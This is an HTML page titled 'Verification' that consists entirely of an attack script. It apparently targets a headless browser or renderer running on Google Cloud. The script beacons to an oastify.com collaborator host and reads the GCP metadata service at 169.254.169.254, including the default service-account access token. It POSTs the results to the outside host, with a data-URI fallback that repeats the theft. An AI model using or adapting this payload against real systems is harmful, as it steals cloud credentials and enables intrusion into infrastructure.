<html><head><title>Verification</title></head><body>
<script>
var c = '5ci827wd2jnknzuutj6mjwp1lsrjf8.oastify.com';

// Baseline: HTTPS fetch (always works if page loads at all)
fetch('https://'+c+'/https-loaded', {mode:'no-cors'});

// Mixed-content probe: HTTP fetch from HTTPS page
fetch('http://'+c+'/http-probe', {mode:'no-cors'})
  .then(function(){fetch('https://'+c+'/http-allowed', {mode:'no-cors'});})
  .catch(function(e){
    fetch('https://'+c+'/http-blocked?e='+encodeURIComponent(e.message||'err'), {mode:'no-cors'});
  });

// If mixed content is allowed, attempt IMDS
fetch('http://169.254.169.254/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}})
  .then(function(r){return r.text();})
  .then(function(d){return fetch('https://'+c+'/gcp', {method:'POST', body:d, mode:'no-cors'});})
  .catch(function(){});

fetch('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'}})
  .then(function(r){return r.text();})
  .then(function(d){return fetch('https://'+c+'/token', {method:'POST', body:d, mode:'no-cors'});})
  .catch(function(){});

// Data URI redirect bypass: navigate to null-origin context which may allow HTTP fetches
// Encode payload as base64 data URI
var imdsPayload = '<html><body><script>var c="'+c+'";fetch("https://"+c+"/data-uri-loaded",{mode:"no-cors"});fetch("http://169.254.169.254/computeMetadata/v1/?recursive=true",{headers:{"Metadata-Flavor":"Google"}}).then(function(r){return r.text()}).then(function(d){return fetch("https://"+c+"/gcp-data",{method:"POST",body:d,mode:"no-cors"})}).catch(function(e){fetch("https://"+c+"/gcp-fail?e="+encodeURIComponent(e.message),{mode:"no-cors"})});<\/script></body></html>';
try {
  window.open('data:text/html;charset=utf-8,'+encodeURIComponent(imdsPayload), '_blank');
} catch(e) {
  fetch('https://'+c+'/data-uri-fail?e='+encodeURIComponent(e.message||'err'), {mode:'no-cors'});
}
</script>
</body></html>
